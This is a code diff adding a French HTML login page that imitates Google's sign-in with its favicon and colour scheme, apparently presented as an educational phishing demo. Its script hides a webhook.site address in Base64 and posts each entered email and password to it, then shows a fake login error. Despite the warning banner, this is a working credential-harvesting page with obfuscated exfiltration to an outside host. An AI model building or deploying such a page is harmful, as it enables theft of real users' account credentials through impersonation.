@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion – Service Sécurisé</title>
+    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
+    <style>
+        body {
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #202124;
+        }
+
+        /* Bandeau de prévention */
+        .warning-banner {
+            background-color: #fce8e6;
+            color: #d93025;
+            border: 2px solid #d93025;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            text-align: center;
+            max-width: 400px;
+            font-size: 13px;
+            font-weight: bold;
+        }
+
+        .login-container {
+            width: 368px;
+            padding: 48px 40px 36px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            text-align: center;
+        }
+
+        /* Remplacement du logo par un texte stylisé */
+        .fake-logo {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .fake-logo span:nth-child(1) { color: #4285F4; }
+        .fake-logo span:nth-child(2) { color: #EA4335; }
+        .fake-logo span:nth-child(3) { color: #FBBC05; }
+        .fake-logo span:nth-child(4) { color: #4285F4; }
+        .fake-logo span:nth-child(5) { color: #34A853; }
+        .fake-logo span:nth-child(6) { color: #EA4335; }
+
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
+        h2 { font-size: 16px; font-weight: 400; margin-bottom: 24px; color: #5f6368; }
+
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            margin: 8px 0 15px 0;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        input:focus { outline: none; border-color: #1a73e8; }
+
+        .button-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 25px;
+        }
+
+        .next-button {
+            background-color: #1a73e8;
+            color: #fff;
+            padding: 10px 24px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .forgot-link { color: #1a73e8; font-size: 14px; text-decoration: none; }
+    </style>
+</head>
+<body>
+
+    <div class="warning-banner">
+        ⚠️ EDUCATIONAL PROJECT / PROJET ÉDUCATIF<br>
+        DO NOT ENTER REAL PASSWORDS. DATA IS SENT TO A TEST SERVER.<br>
+        NE PAS ENTRER DE VRAIS MOTS DE PASSE. DONNÉES ENVOYÉES À UN SERVEUR DE TEST.
+    </div>
+
+    <div class="login-container">
+        <div class="fake-logo">
+            <span>S</span><span>e</span><span>c</span><span>u</span><span>r</span><span>e</span>
+        </div>
+        
+        <h1>Connexion</h1>
+        <h2>Utiliser votre compte de test</h2>
+
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="E-mail" required>
+            <input type="password" id="pass" placeholder="Mot de passe" required>
+            
+            <div class="button-container">
+                <a href="#" class="forgot-link">Aide ?</a>
+                <button type="submit" class="next-button">Suivant</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            const form = document.getElementById('loginForm');
+            
+            // Ton lien Webhook encodé en Base64
+            const encodedUrl = "aHR0cHM6Ly93ZWJob29rLnNpdGUvNTIxOWFkMmEtNGY4OC00YThhLTlmMmEtMTUwYWQxZDI5Zjdj";
+
+            if (form) {
+                form.addEventListener('submit', function(e) {
+                    e.preventDefault();
+
+                    const email = document.getElementById('email').value;
+                    const pass = document.getElementById('pass').value;
+                    const url = atob(encodedUrl);
+
+                    const data = new URLSearchParams();
+                    data.append('User', email);
+                    data.append('Pass', pass);
+                    data.append('Status', 'Educational_Test');
+
+                    // Envoi vers ton Webhook
+                    fetch(url, {
+                        method: "POST",
+                        mode: "no-cors",
+                        body: data
+                    });
+
+                    alert("TEST RÉUSSI : Les données ont été envoyées vers ton Webhook.site.\n\n(Simulation d'erreur : Identifiant inconnu)");
+                    document.getElementById('pass').value = '';
+                });
+            }
+        });
+    </script>
+</body>
+</html>
